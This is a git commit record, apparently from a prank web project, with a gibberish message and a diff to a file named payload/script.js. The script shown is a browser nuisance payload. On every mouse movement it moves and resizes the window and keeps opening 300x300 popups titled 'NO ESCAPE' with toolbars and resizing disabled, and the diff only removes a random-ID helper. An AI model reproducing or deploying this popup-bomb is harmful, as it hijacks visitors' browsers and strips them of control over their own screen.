12de2282b3bc97b54093d456f170a7df28cbc9db
Evan Boehs <ebrobot2000@gmail.com>
2021-04-01 18:55:26 -0400

    dgsdgsdgsd

--- payload/script.js
+++ payload/script.js
@@ -1,19 +1,8 @@
-function makeid(length) {
-	var result = "";
-	var characters =
-		"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-	var charactersLength = characters.length;
-	for (var i = 0; i < length; i++) {
-		result += characters.charAt(Math.floor(Math.random() * charactersLength));
-	}
-	return result;
-}
-
 document.onmousemove = function (event) {
 	window.moveBy(event.clientX - 150, event.clientY - 100);
 	window.resizeTo(300, 300);
 	var thiswindow2 = window.open(
-		"/payload?" + makeid(5),
+		"/payload?",
 		"NO ESCAPE",
 		`toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no,width=300,height=300`
 	);
